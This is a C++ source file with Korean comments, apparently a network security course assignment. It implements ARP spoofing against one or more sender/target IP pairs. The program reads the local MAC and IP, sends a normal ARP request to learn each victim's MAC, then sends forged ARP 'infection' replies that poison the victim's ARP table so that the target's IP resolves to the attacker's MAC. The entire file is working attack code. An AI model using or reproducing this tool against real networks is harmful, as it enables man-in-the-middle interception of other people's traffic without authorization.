#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <vector>
#include <cstring>
#include <string>
#include <cstdlib>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "mac.h"
#include "ip.h"



#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

using namespace std;


void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

// sender의 MAC 주소를 알아내서 나의 MAC 주소가 GATEWAY인것 처럼 REPLY를 날려 victim의 apr 테이블을 변조한다


// 1. 나의 mac,ip 자동 조회
// 2. 정상 arp request 전송
// 3, sender의 arp reply 수신
// 4. sender mac 추출
// 5. 패킷 만들어 sender에게 전송


// mac주소 저장
bool getInterfaceMac(const char * interfaceName, Mac & mac) {
    int sock = socket(AF_INET, SOCK_DGRAM,0);
    if (sock <0 ) {
        perror("socket");
        return false;
    }

    struct ifreq ifr{};
    std::strncpy(ifr.ifr_name, interfaceName, IFNAMSIZ -1);

    if(ioctl(sock, SIOCGIFHWADDR, &ifr) < 0 ){
        perror("ioctl(SIOCGIFHWADDR)");
        close(sock);
        return false;
    }

    mac = Mac{
        reinterpret_cast<const uint8_t*>(ifr.ifr_hwaddr.sa_data)
    };

    close(sock);
    return true;

}

// ip 저장
bool getInterfaceIp(const char* interfaceName, Ip& ip) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        return false;
    }

    struct ifreq ifr{};
    std::strncpy(ifr.ifr_name, interfaceName, IFNAMSIZ - 1);

    if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) {
        perror("ioctl(SIOCGIFADDR)");
        close(sock);
        return false;
    }

    struct sockaddr_in* addr =
        reinterpret_cast<struct sockaddr_in*>(&ifr.ifr_addr);

    ip = Ip(ntohl(addr->sin_addr.s_addr));

    close(sock);
    return true;
}

// 정상적인 arp requet 보냄
EthArpPacket makeArpRequest(const Mac & aMac, const Ip& aIp, const Ip& sIp)
{
    EthArpPacket packet{};

    //ethernet 헤더
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = aMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    //arp 헤더
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = aMac;
    packet.arp_.sip_ = htonl(aIp);
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");       // arp target mac은 아직 모르기 때문에 0
    packet.arp_.tip_ = htonl(sIp);

    return packet;

}

bool sendArpPacket(pcap_t* pcap, const EthArpPacket& packet) {
    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
        return false;
    }
    return true;

}

// sender ARP Reply 수신

bool receiveSenderMac(pcap_t * pcap, const Mac& aMac, const Ip& aIp, const Ip& sIp, Mac& sMac) {

    struct pcap_pkthdr * header;
    const u_char* receivedPacket;

    while(true) {
        int res = pcap_next_ex(pcap, &header, &receivedPacket);

        if(res == 0) {
            continue;
        }

        if(res == -1) {
            fprintf(stderr, "pcap_next_ex fail %s\n", pcap_geterr(pcap));
            return false;
        }
        if(res== -2){
            return false;
        }

        if (header->caplen < sizeof(EthArpPacket)) {
            continue;
        }

        const EthArpPacket* packet = reinterpret_cast<const EthArpPacket*>(receivedPacket);

        if(ntohs(packet->eth_.type_) != EthHdr::Arp || ntohs(packet->arp_.op_) != ArpHdr::Reply){
            continue;
        }


        if (ntohl(packet->arp_.sip_) != sIp || ntohl(packet->arp_.tip_) !=aIp) {
            continue;
        }

        if (packet->arp_.tmac_!=aMac){
            continue;
        }

        sMac= packet->arp_.smac_;

        printf("sender Mac : %s\n",string(sMac).c_str());

        return true;
    }


}

EthArpPacket makeInfectionReply(const Mac & aMac,const Mac & sMac, const Ip& sIp, const Ip& tIp)
{
    EthArpPacket packet{};

    //ethernet 헤더
    packet.eth_.dmac_ = sMac;
    packet.eth_.smac_ = aMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    //arp 헤더
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = aMac;
    packet.arp_.sip_ = htonl(tIp);      //이거 gateway ip로 바꿔야하잖아
    packet.arp_.tmac_ = sMac;       //
    packet.arp_.tip_ = htonl(sIp);

    return packet;

}


int main(int argc, char* argv[]) {
    if (argc < 4 || (argc-2) %2 != 0) {        // 여러 쌍을 못받거나 쌍이 아닐경우 실패
		usage();
		return EXIT_FAILURE;
	}

    struct Session{
        Ip sIp;
        Ip tIp;
        Mac sMac;
    };

    vector<Session> sessions;

    for (int i=2; i<argc; i+=2) {
        Session s1;
        s1.sIp = Ip(argv[i]);
        s1.tIp = Ip(argv[i+1]);

        sessions.push_back(s1);

    }

    char* dev = argv[1];

    // 내 mac,ip주소 가져오기
    Mac aMac;
    Ip aIp;

    if (!getInterfaceMac(dev, aMac)) {
        fprintf(stderr, "attack mac 주소 가져오기 실패");
        return EXIT_FAILURE;
    }

    if (!getInterfaceIp(dev, aIp)) {
        fprintf(stderr, "attack ip 주소 가져오기 실패");
        return EXIT_FAILURE;
    }




	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return EXIT_FAILURE;
	}

    printf("Attacker MAC : %s \n", string(aMac).c_str());
    printf("Attacker IP : %s \n", string(aIp).c_str());

    for(Session& session : sessions) {
        printf("\n Sender Ip: %s , Target Ip : %s\n",string(session.sIp).c_str(),string(session.tIp).c_str());


        EthArpPacket request = makeArpRequest(aMac, aIp, session.sIp);

        if(!sendArpPacket(pcap,request)) {
            fprintf(stderr, "ARP Request 전송 실패 \n");
            continue;
        }

        if(!receiveSenderMac(pcap,aMac,aIp,session.sIp,session.sMac)) {
            fprintf(stderr,"Sender mac 못받음");
            continue;
        }


        EthArpPacket infection = makeInfectionReply(aMac,session.sMac,session.sIp,session.tIp);

        if(!sendArpPacket(pcap, infection)) {
            fprintf(stderr,"arp 감염 패킷 전송 실패\n");
            continue;
        }


        printf("arp 감염 패킷 보냄\n");

    }

	pcap_close(pcap);
}
